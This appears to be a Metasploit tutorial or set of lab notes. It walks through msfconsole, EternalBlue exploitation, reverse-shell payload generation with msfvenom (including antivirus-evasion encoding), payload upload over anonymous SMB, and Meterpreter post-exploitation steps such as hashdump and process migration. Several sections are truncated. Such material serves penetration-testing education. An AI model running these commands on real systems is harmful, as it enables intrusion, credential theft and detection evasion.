## Introduction to Metasploit

Metasploit is a powerful and versatile framework used for penetration testing, security research, and vulnerability assessment. It provides tools to discover, exploit, and validate vulnerabilities in systems, making it an essential asset for security professionals.

## Metasploit Framework

The Metasploit Framework is an open-source platform that allows security experts to develop, test, and execute exploit code. It offers a comprehensive suite of tools, including exploit modules, payloads, and auxiliary modules, enabling users to simulate real-world attacks on networks and applications.

### Main Components of the Metasploit Framework

The Metasploit Framework consists of several key components that facilitate its functionality:

1. **msfconsole**: The main command-line interface of Metasploit. It is the most commonly used interface for accessing and interacting with the Metasploit Framework. Through msfconsole, users can configure and execute exploits, payloads, and auxiliary modules.

2. **Modules**: Metasploit includes various modules that support its operations, such as:

    - **Exploits**: Code that takes advantage of vulnerabilities in systems to gain unauthorized access. Categories under exploits include:

3. **Tools**: Metasploit offers a set of stand-alone tools designed to assist with vulnerability research, vulnerability assessment, and penetration testing. Notable tools include:
    - **msfvenom**: A payload generator and encoder tool used to create custom payloads for use in exploits.
    - **pattern_create and pattern_offset**: Tools useful in exploit development for creating and identifying unique patterns in memory, helping to determine the offset needed for buffer overflow exploits.

## Using msfconsole

The console will be your main interface to the Metasploit Framework. You can launch it using the `msfconsole` command on any system where the Metasploit Framework is installed.

```plaintext
msfconsole
```

The `msfconsole` can be used just like a regular command-line shell.

### Core Concepts and Examples

1. **Running Commands**

   You can execute basic Linux commands directly from the `msfconsole`. For example:

   ```plaintext
   msf6 > pwd
   [*] exec: pwd
   /home/user
   ```

   ```plaintext
   msf6 > uname -a
   [*] exec: uname -a
   Linux kernel_version #1 SMP date arch GNU/Linux
   ```

2. **Help Command**

   The `help` command can be used on its own or for a specific command. It provides useful information on how to use Metasploit commands.

   ```plaintext
   msf6 > help search
   Usage: search [keywords]
   Search for modules with a matching description, using the keyword search.
   ```

3

. **History Command**

   You can use the `history` command to see commands you have typed earlier.

   ```plaintext
   msf6 > history
   1  use exploit/multi/handler
   2  set payload windows/meterpreter/reverse_tcp
   3  set lhost 192.168.1.100
   4  set lport 4444
   5  exploit
   ```

4. **Tab Completion**

   An important feature of `msfconsole` is the support of tab completion. This will come in handy when using Metasploit commands or dealing with modules. For example, if you start typing `sea` and press the tab key, it will auto-complete to `search`.

5. **Context Management**

   `msfconsole` is managed by context; this means that unless set as a global variable, all parameter settings will be lost if you change the module you have decided to use. For example, if you set parameters for one exploit and then switch to another module, you will need to set those parameters again.

   ```plaintext
   msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
   [*] No payload configured, defaulting to cmd/unix/interact
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
   ```

6. **Show Options**

   The `show options` command will display the options available for the current module context.

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

   Module options (exploit/unix/ftp/vsftpd_234_backdoor):

      Name     Current Setting  Required  Description
      ----     ---------------  --------  -----------
      RHOSTS                    yes       The target address range or CIDR identifier
      RPORT    21               yes       The target port (TCP)
   ```

7. **Back Command**

   You can leave the current context using the `back` command.

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > back
   msf6 >
   ```

8. **Info Command**

   Further information on any module can be obtained by typing the `info` command within its context.

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info

         Name: VSFTPD v2.3.4 Backdoor Command Execution
       Module: exploit/unix/ftp/vsftpd_234_backdoor

   ```

9. **Search Command**

   The `search` command will search the Metasploit Framework database for modules relevant to the given search parameter. You can conduct searches using CVE numbers, exploit names, or target systems.

   ```plaintext
   msf6 > search vsftpd

   Matching Modules
   =================

      #  Name                                 Disclosure Date  Rank       Check  Description

## Direct Exploit vs. Uploading a Payload

The choice between using a direct exploit and uploading a payload depends on various factors, including the vulnerability you are exploiting, the target environment, and the specific goal you are trying to achieve. Let's break down these concepts and explain when and how to use each approach.

### Direct Exploit

**When to Use:**
- **Vulnerability Exists**: The target is known to be vulnerable to a specific exploit.
- **Single-Step Exploitation**: The exploit can directly deliver and execute the payload on the target.
- **Automated Process**: You want to automate the exploitation process as much as possible.

**How to Use:**
1. **Select the Exploit Module**:
   ```plaintext
   use exploit/windows/smb/ms17_010_eternalblue
   ```
2. **Configure the Exploit**:
   ```plaintext
   set RHOSTS 10.10.164.10
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <your_ip>
   set LPORT <your_port>
   ```
3. **Run the Exploit**:
   ```plaintext
   exploit
   ```

### Uploading a Payload

**When to Use:**
- **Indirect Exploitation**: Direct exploitation is not possible or reliable.
- **File Upload/Execution**: You have the ability to upload and execute files on the target.
- **Bypassing Detection**: Uploading a payload might bypass some security mechanisms that detect direct exploitation.

**How to Use:**

1. **Generate the Payload with `msfvenom`**:
   ```bash
   msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<your_ip> lport=<your_port> -f aspx -o reverse_shell.aspx
   ```
2. **Upload the Payload**:
   ```bash
   smbclient //10.10.164.10/nt4wrksv -U "" -N
   put reverse_shell.aspx
   ```
3. **Set Up a Listener in Metasploit**:
   ```plaintext
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <your_ip>
   set LPORT <your_port>
   exploit
   ```
4. **Trigger the Payload**:
   Access the uploaded payload to execute it, for example:
   ```plaintext
   http://10.10.164.10/nt4wr

ksv/reverse_shell.aspx
   ```

### Using Multi/Handler

**When to Use:**
- **Handling Reverse Connections**: Multi/Handler is used to set up a listener for incoming connections from payloads that have been executed on the target.
- **Independent of Exploit**: It can be used independently of the exploitation method to handle the reverse shell.

**How to Use:**

1. **Select Multi/Handler**:
   ```plaintext
   use exploit/multi/handler
   ```
2. **Configure the Payload**:
   ```plaintext
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST <your_ip>
   set LPORT <your_port>
   ```
3. **Start the Listener**:
   ```plaintext
   exploit
   ```

### Scenarios

#### Scenario 1: Direct Exploit (EternalBlue)

- **Vulnerability**: MS17-010
- **Goal**: Directly exploit and get a reverse shell.
- **Steps**:
  1. Use `exploit/windows/smb/ms17_010_eternalblue`.
  2. Set options and payload.
  3. Run `exploit`.

#### Scenario 2: Uploading a Payload

- **Situation**: Direct exploit is unreliable or target environment allows file uploads.
- **Goal**: Upload and execute a reverse shell payload.
- **Steps**:
  1. Generate the payload with `msfvenom`.
  2. Upload the payload using `smbclient`.
  3. Set up a listener with `exploit/multi/handler`.
  4. Trigger the payload via HTTP or another method.

### Example Workflow

1. **Generate Payload**:
   ```bash
   msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.10.10 lport=4444 -f aspx -o reverse_shell.aspx
   ```

2. **Upload Payload**:
   ```bash
   smbclient //10.10.164.10/nt4wrksv -U "" -N
   put reverse_shell.aspx
   ```

3. **Set Up Listener**:
   ```plaintext
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   set LHOST 10.10.10.10
   set LPORT 4444
   exploit
   ```

4. **Trigger Payload**:
   ```plaintext
   http://10.10.164.10/nt4wrksv/reverse_shell.aspx
   ```

By understanding the contexts in which to use direct exploitation versus payload upload and how to use Multi/Handler for handling reverse shells, you can effectively adapt your approach based on the target environment and the specific vulnerabilities you are exploiting.

## The Metasploit Database

The Metasploit database is an essential component for managing and storing information about hosts, services, vulnerabilities, and more. Using the database, you can efficiently track and analyze your penetration testing activities.

### Setting Up the Database

First, you need to initialize and connect to the database. This can be done using the following commands:

```plaintext
msf6 > db_init
```

To verify the connection to the database, use:

```plaintext
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

### Core Concepts

1. **Hosts and Services:**
   The database stores information about discovered hosts and their services. This helps in keeping track of the network landscape during an assessment.

   ```plaintext
   msf6 > db_nmap 192.168.1.0/24
   msf6 > hosts
   ```

2. **Vulnerabilities:**
   You can log discovered vulnerabilities into the database. This provides a centralized place to review and manage them.

   ```plaintext
   msf6 > vulns
   ```

3. **Loot:**
   Any valuable information gathered during a penetration test can be stored in the database as loot.

   ```plaintext
   msf6 > loot
   ```

#### Examples

- **Adding Hosts:**
  Manually add a host to the database:

  ```plaintext
  msf6 > db_add_host 192.168.1.100
  ```

- **Listing Services:**
  View services discovered on the hosts:

  ```plaintext
  msf6 > services
  ```

- **Finding Vulnerabilities:**
  Search for vulnerabilities in the database:

  ```plaintext
  msf6 > vulns -h
  ```

- **Storing Loot:**
  Save collected data for future reference:

  ```plaintext
  msf6 > db_loot
  ```

## Msfvenom

`msfvenom` is a powerful standalone tool for generating and encoding payloads used in exploits. It combines the functionalities of `msfpayload` and `msfencode` into a single utility, making it easier to create custom payloads for various attack scenarios.

### Core Concepts

1. **Payloads:**
   These are the code that runs on the target system after exploitation. `msfvenom` allows you to generate payloads for various platforms and architectures.

2. **Encoders:**
   Encoders are used to encode payloads to avoid detection by antivirus software. `msfvenom` supports multiple encoders to help obfuscate your payloads.

3. **Formats:**
   Payloads can be output in various formats, such as executables, scripts, and shellcode. This flexibility allows you to use `msfvenom` payloads in different attack vectors.

### Basic Usage

The basic syntax for using `msfvenom` is:

```plaintext
msfvenom -p PAYLOAD OPTIONS -e ENCODER -f FORMAT -o OUTPUT_FILE
```

### Examples

1. **Generating a Reverse TCP Shell:**

   Generate a Windows reverse TCP shell payload:

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe
   ```

2. **Encoding a Payload:**

   Encode the payload with the `shikata_ga_nai` encoder:

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
   ```

3. **Generating Shellcode:**

   Generate shellcode for a Linux payload:

   ```plaintext
   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c -o shellcode.c
   ```

4. **Creating a PHP Payload:**

   Create a PHP reverse shell payload:

   ```plaintext
   msfvenom -p php/reverse_php LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php
   ```

### Practical Workflow

1. **Select Payload:**
   Choose the appropriate payload for your target system and scenario.

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444
   ```

2. **Choose Encoder (if needed):**
   Encode the payload to avoid detection.

   ```plaintext
   -e x86/shikata_ga_nai -i 5
   ```

3. **Specify Output Format:**
   Define the format for the payload.

   ```plaintext
   -f exe -o shell.exe
   ```

4. **Generate Payload:**
   Execute the `msfvenom` command to generate the payload.

   ```plaintext
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
   ```

### Output Formats

`msfvenom` supports various output formats, including:

- **Executable:** `-f exe`
- **Raw Shellcode:** `-f raw`
- **C Code:** `-f c`
- **PHP:** `-f raw` (typically used for web payloads)
- **Python:** `-f python`

Understanding and using `msfvenom` effectively allows you to create tailored payloads that can evade detection and fit into different exploit scenarios.

## Meterpreter

Meterpreter is an advanced and extensible payload within the Metasploit Framework that provides a powerful way to interact with the target system post-exploitation. It operates in memory, making it stealthy and difficult to detect. Here, we cover the core concepts of Meterpreter, its various flavors, and examples of its powerful commands.

### Meterpreter Commands

Meterpreter provides a wide range of built-in commands categorized into core commands, file system commands, networking commands, and more. Each version of Meterpreter (e.g., Windows, Linux) has different command options. Running the `help` command within a Meterpreter session lists all available commands for that version.

#### Core Commands

- **help:** Lists all available commands.

  ```plaintext

### Practical Workflow

1. **Getting User ID:**

   ```plaintext
   meterpreter > getuid
   Server username: NT AUTHORITY\SYSTEM
   ```

2. **Listing Processes:**

   ```plaintext
   meterpreter > ps
   ```

3. **Migrating to Another Process:**

   ```plaintext
   meterpreter > migrate 1234
   [*] Migrating from 5678 to 1234...
   [*] Migration completed successfully.
   ```

4. **Dumping Password Hashes:**

   ```plaintext
   meterpreter > hashdump
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   ```

5. **Searching for Files:**

   ```plaintext
   meterpreter > search -f confidential.txt
   Found 1 result...
     c:\Users\Public\Documents\confidential.txt
   ```

6. **Launching a Shell:**

   ```plaintext
   meterpreter > shell
   Microsoft Windows [Version 10.0.19042.1052]
   C:\Windows\system32>
   ```
